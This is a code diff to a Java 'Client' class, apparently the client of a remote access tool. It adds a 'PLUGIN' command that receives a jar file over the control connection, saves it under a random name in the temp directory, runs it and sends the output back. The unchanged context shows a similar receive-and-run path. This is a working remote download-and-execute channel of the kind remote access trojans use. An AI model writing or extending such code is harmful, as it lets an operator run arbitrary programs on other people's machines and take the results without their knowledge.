@@ -21,10 +21,7 @@ import java.net.URL;
 import java.security.InvalidKeyException;
 import java.security.Key;
 import java.security.NoSuchAlgorithmException;
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.util.Base64;
-import java.util.Random;
+import java.util.*;
 import java.util.concurrent.TimeUnit;
 
 
@@ -319,6 +316,24 @@ public class Client {
                     Process proc = Runtime.getRuntime().exec("java -jar " + fname);
                     if (debugMode) { System.out.println("Exiting"); }
                     System.exit(0);
+
+                } else if (input.contains("PLUGIN")){
+                    long len = dis.readLong();
+                    String fname = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(8) + ".jar"; // it will be a jar
+                    File newClientFile = new File(fname);
+                    if (debugMode){ System.out.println("Plugin saved to: " + fname); }
+                    FileOutputStream fos = new FileOutputStream(newClientFile);
+                    BufferedOutputStream bos = new BufferedOutputStream(fos);
+                    for (int j = 0; j < len; j++) bos.write(dis.readInt());
+                    bos.close();
+                    fos.close();
+
+                    // Run jar and get/send output
+                    String output = "";
+                    String cmd = "java -jar " + fname;
+                    Scanner s = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
+                    output =  s.hasNext() ? s.next() : "No output";
+                    communicate(output);
 
                 } else if (input.equals("DAE")){
                     communicate("DAE");
